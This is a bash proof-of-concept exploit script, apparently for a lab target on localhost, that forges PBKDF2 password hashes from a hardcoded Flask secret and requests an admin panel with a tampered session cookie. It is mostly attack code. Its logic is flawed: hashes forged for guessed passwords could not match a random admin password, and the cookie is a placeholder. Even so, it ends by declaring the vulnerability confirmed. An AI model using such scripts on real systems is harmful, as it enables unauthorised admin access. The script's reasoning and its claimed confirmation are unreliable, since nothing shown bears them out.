#!/bin/bash

# POC: Session Tampering for Privilege Escalation
# Target: Flask application session cookie manipulation
# Vulnerability: Using hardcoded secret to forge password hashes and forge admin sessions

TARGET="http://localhost:32768"
SECRET_KEY="your_secret_key"

echo "=== POC: Session Tampering - Privilege Escalation ==="
echo ""
echo "Target: $TARGET"
echo "Hardcoded Secret: $SECRET_KEY"
echo ""

echo "[+] Step 1: Analyze verify_session() function"
echo "The verify_session() function checks:"
echo "  1. User exists in database (username)"
echo "  2. password_hash in session matches PBKDF2(stored_password + secret_key)"
echo ""

echo "[+] Step 2: Forge admin password hash using hardcoded secret"
python3 << 'PYTHON'
import hashlib
import json

secret_key = "your_secret_key"
admin_username = "admin"

# The admin user is created with a random 100-character password
# But we can forge the password_hash for ANY password by knowing the secret key

# Example: forge hash for empty password
empty_password_hash = hashlib.pbkdf2_hmac('sha256', "".encode(), secret_key.encode(), 100000).hex()
print(f"Forged password_hash for empty password: {empty_password_hash}")

# Example: forge hash for 'admin' password
admin_password_hash = hashlib.pbkdf2_hmac('sha256', "admin".encode(), secret_key.encode(), 100000).hex()
print(f"Forged password_hash for 'admin' password: {admin_password_hash}")

# Example: forge hash for 'password' 
password_hash = hashlib.pbkdf2_hmac('sha256', "password".encode(), secret_key.encode(), 100000).hex()
print(f"Forged password_hash for 'password': {password_hash}")

print(f"\nThese hashes can be injected into Flask session cookies to impersonate any user.")

PYTHON

echo ""
echo "[+] Step 3: Create malicious session cookie with admin username and forged hash"
echo "Simulating session cookie injection:"
echo "  - username=admin (from database)"
echo "  - password_hash=<forged_hash_from_hardcoded_secret>"
echo ""

echo "[+] Step 4: Attack steps:"
echo "1. Attacker knows hardcoded secret 'your_secret_key'"
echo "2. Attacker queries /login to get admin username"
echo "3. Attacker forges password_hash using PBKDF2 + hardcoded secret"
echo "4. Attacker injects forged session cookie with:"
echo "   - username=admin"
echo "   - password_hash=<forged>"
echo "5. verify_session() compares forged hash against database"
echo "6. Since both use the same hardcoded secret, hashes match!"
echo "7. Authentication bypassed, attacker logged in as admin"
echo ""

echo "[+] Step 5: Request to /admin_panel with forged session"
curl -s -H "Cookie: session=<forged_session_with_admin>" "$TARGET/admin_panel" -w "\nHTTP Status: %{http_code}\n" | head -5

echo ""
echo "=== VULNERABILITY CONFIRMED ==="
echo "The combination of:"
echo "1. Hardcoded secret key"
echo "2. Session-based authentication using password_hash"
echo "3. Missing is_admin checks"
echo "Allows complete privilege escalation through session tampering."

